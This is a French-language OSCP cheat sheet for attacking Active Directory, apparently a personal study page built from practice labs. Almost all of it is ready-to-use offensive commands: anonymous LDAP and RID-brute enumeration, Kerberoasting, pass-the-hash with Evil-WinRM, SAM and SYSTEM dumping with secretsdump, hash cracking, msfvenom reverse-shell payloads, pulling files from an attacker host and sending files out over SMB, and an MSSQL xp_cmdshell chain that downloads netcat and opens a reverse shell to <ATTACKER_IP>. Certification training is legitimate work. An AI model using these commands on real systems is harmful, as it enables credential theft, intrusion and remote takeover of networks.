# 🏅 OSCP Active Directory Cheat Sheet

{% hint style="success" %}
Ce document regroupe tout ce que j’ai appris au travers des box et des cours de préparation aux techniques d’exploitation Active Directory. Il reflète mon expérience personnelle et n’engage que moi. Je ne couvre pas ici les techniques les plus avancées, mais vous pouvez vous tourner vers d’autres ressources comme [The Hacker Recipes](https://www.thehacker.recipes/) pour approfondir le sujet.
{% endhint %}

***

## **🛡️ Active Directory Cheat Sheet**

### 📌 Reconnaissance & Énumération

#### 🔍 **LDAP Enumeration**

*   **Énumération LDAP anonyme**

    ```bash
    ldapsearch -v -x -b "DC=<DOMAIN>,DC=com" -H "ldap://<IP>" "(objectclass=*)"
    ```
*   **Énumération LDAP authentifiée (LAPS Password)**

    ```bash
    ldapsearch -x -H "ldap://<IP>" -D "<DOMAIN>\<USER>" -w "<PASSWORD>" -b "DC=<DOMAIN>,DC=com" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
    ```
*   **Énumération avec Windapsearch**

    ```bash
    ./windapsearch.py --dc-ip <IP> -u "" -U
    ```
*   **Extraction des utilisateurs via NetExec**

    ```bash
    nxc ldap "<DC>" -d "<DOMAIN>" -u "<USER>" -p "<PASSWORD>" -M get-desc-users
    ```

#### 📂 **SMB Enumeration**

*   **Lister les partages SMB accessibles**

    ```bash
    crackmapexec smb <IP> --shares -u <USER> -p <PASSWORD>
    ```
*   **Brute force RID pour extraire les utilisateurs**

    ```bash
    nxc smb <IP> -u '' -p '' --rid-brute
    ```

#### 🎭 **SPN & Kerberoasting**

*   **Extraction des SPN**

    ```bash
    impacket-GetUserSPNs -dc-ip <IP> <DOMAIN>/<USER>:<PASSWORD> -request
    ```
*   **Lister les SPN d'un compte spécifique**

    ```powershell
    Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
    ```

#### 💾 **MSSQL Enumeration**

*   **Connexion MSSQL avec authentification Windows**

    ```bash
    impacket-mssqlclient '<DOMAIN>/<USER>':'<PASSWORD>'@<IP> -dc-ip <IP> -windows-auth
    ```

***

### 🔑 Accès Initial (Foothold)

*   **RCE via PSExec (Administrator Privileges)**

    ```bash
    python psexec.py <DOMAIN>/<ADMIN>:<PASSWORD>@<IP>
    ```
*   **Pass-the-Hash via Evil-WinRM**

    ```bash
    evil-winrm -i <IP> -u <USER> -H "<NTLM_HASH>"
    ```
*   **Connexion MSSQL avec Silver Ticket**

    ```bash
    impacket-mssqlclient -k <MSSQL_HOST>
    ```

***

### 🏆 Escalade de Privilèges (PrivEsc)

*   **Dump de la base SAM**

    ```powershell
    reg save hklm\sam C:\Temp\sam
    ```
*   **Dump de la base SYSTEM**

    ```powershell
    reg save hklm\system C:\Temp\system
    ```
*   **Extraction des hashes NTLM**

    ```bash
    impacket-secretsdump -system system -sam sam local
    ```

```bash
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

#### 🎯 **Droits Windows (Privilege Escalation)**

* **SeBackupPrivilege** → Lire des fichiers normalement inaccessibles
* **SeRestorePrivilege** → Écraser des fichiers protégés
* **SeImpersonatePrivilege** → Exploitable avec JuicyPotato pour devenir SYSTEM
* **SeLoadDriverPrivilege** → Charger des drivers malveillants

***

### 💥 Cracking des Hashes

*   **NTLM**

    ```bash
    hashcat -m 1000 -a 3 hash.txt
    ```
*   **NetNTLMv1**

    ```bash
    hashcat -m 5500 -a 3 hash.txt
    ```
*   **NetNTLMv2**

    ```bash
    john --format=netntlmv2 hash.txt
    ```
*   **SPN Hash (Kerberoasting)**

    ```bash
    hashcat -m 13100 -a 0 spn.txt rockyou.txt
    ```

***

### 🚀 Payloads & Reverse Shells

*   **Windows Meterpreter**

    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe > shell.exe
    ```
*   **Windows Shell Staged**

    ```bash
    msfvenom -p windows/shell/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe > shell.exe
    ```
*   **PowerShell Reverse Shell**

    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=<PORT> -f psh-cmd
    ```

***

### 🔄 Transfert de Fichiers

*   **Serveur HTTP Python**

    ```bash
    python3 -m http.server 80
    ```
*   **Télécharger un fichier via PowerShell**

    ```powershell
    powershell -c "Invoke-WebRequest -Uri 'http://<ATTACKER_IP>/file.exe' -OutFile 'C:\Users\Public\file.exe'"
    ```
*   **Exfiltration via SMB**

    ```bash
    smbclient //<ATTACKER_IP>/SHARE -U "USER" -c "put file.exe"
    ```

***

### 🏴‍☠️ Post-Exploitation

*   **Changement du mot de passe via RPC**

    ```bash
    setuserinfo <USER> 23 'NewPassword123!'
    ```
*   **Utilisation d’un ticket Kerberos pour MSSQL**

    ```bash
    export KRB5CCNAME=$PWD/Administrator.ccache
    ```
*   **Téléchargement de Netcat via MSSQL**

    ```bash
    xp_cmdshell "curl http://<ATTACKER_IP>/nc.exe -o c:\temp\nc.exe"
    ```
*   **Reverse Shell via MSSQL**

    ```bash
    xp_cmdshell "c:\temp\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe"
    ```
